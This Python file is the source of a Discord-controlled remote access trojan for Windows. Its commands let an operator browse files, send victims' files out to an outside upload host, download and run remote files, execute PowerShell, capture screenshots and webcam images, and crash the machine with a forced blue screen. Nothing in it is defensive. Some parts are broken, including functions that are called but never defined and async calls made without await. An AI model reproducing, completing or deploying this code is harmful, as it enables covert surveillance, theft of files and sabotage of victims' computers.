import discord
import sys
from settings import *
from cv2 import VideoCapture, imwrite, CAP_DSHOW
import os
import discord
import subprocess
import requests
import pyautogui
import ctypes
import sys
from threading import Timer
from datetime import datetime

client = discord.Client(intents=discord.Intents.all())
session_id = os.urandom(6).hex()

guild = client.get_guild(int(guild_id))
channel = guild.create_text_channel(session_id)

commands = "\n".join([
    "help - Help Command",
    "ping - Ping Command",
    "cd - Change Directory",
    "ls - List Directory",
    "download <file> - Download File",
    "upload <link> - Upload File",
    "cmd - Execute CMD Command",
    "run <file> - Run an File",
    "screenshot - Take a Screenshot",
    "blue - DeadScreen",
    "start - Add To start",
    "exit - Exit The Session",
])
@client.event
async def on_ready():
    await channel.send("clinically online!")
    
@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.channel.name != session_id:
        return

    if message.content == "help" or message.content == "Help":
        embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ping" or message.content == "Ping":
        embed = discord.Embed(title="Ping", description=f"```{round(client.latency * 1000)}ms```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("cd") or message.content.startswith("Cd"):
        directory = message.content.split(" ")[1]
        try:
            os.chdir(directory)
            embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
        except:
            embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ls" or message.content == "Ls":
        files = "\n".join(os.listdir())
        if files == "":
            files = "No Files Found"
        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("download") or message.content.startswith("Download"):
        file = message.content.split(" ")[1]
        try:
            link = requests.post("https://api.letsupload.cc/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
            embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
            await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
            await message.reply(embed=embed)

    if message.content.startswith("upload") or message.content.startswith("Upload"):
        link = message.content.split(" ")[1]
        file = requests.get(link).content
        with open(os.path.basename(link), "wb") as f:
            f.write(file)
        embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("shell") or message.content.startswith("Shell"):
        command = message.content.split(" ")[1]
        output = subprocess.Popen(
            ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
        ).communicate()[0].decode("utf-8")
        if output == "":
            output = "No output"
        embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("run") or message.content.startswith("Run"):
        file = message.content.split(" ")[1]
        subprocess.Popen(file, shell=True)
        embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("exit"):
        await message.channel.delete()
        await client.close()
    
    if message.content == "start":
        await message.reply("Ok Boss")
        await start()
        
    if message.content == "blue" or message.content == "Blue":
        await message.reply("Attempting...", delete_after = .1)
        ntdll = ctypes.windll.ntdll
        prev_value = ctypes.c_bool()
        res = ctypes.c_ulong()
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
            await message.reply("Blue Successful!")
        else:
            await message.reply("Blue Failed! :(")

    if message.content.startswith("screenshot"):
        screenshot = pyautogui.screenshot()
        path = os.path.join(os.getenv("TEMP"), "screenshot.png")
        screenshot.save(path)
        file = discord.File(path)
        embed = discord.Embed(title="Screenshot", color=0xfafafa)
        embed.set_image(url="attachment://screenshot.png")
        await message.reply(embed=embed, file=file)

    if message.content[8:] == 'photo':
        webcam = VideoCapture(0, CAP_DSHOW)
        result, image = webcam.read()
        imwrite('webcam.png', image)
        reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'), file=discord.File('webcam.png')); await reaction_msg.add_reaction('📌')
        subprocess.run('del webcam.png', shell=True)

client.run(bot_token)
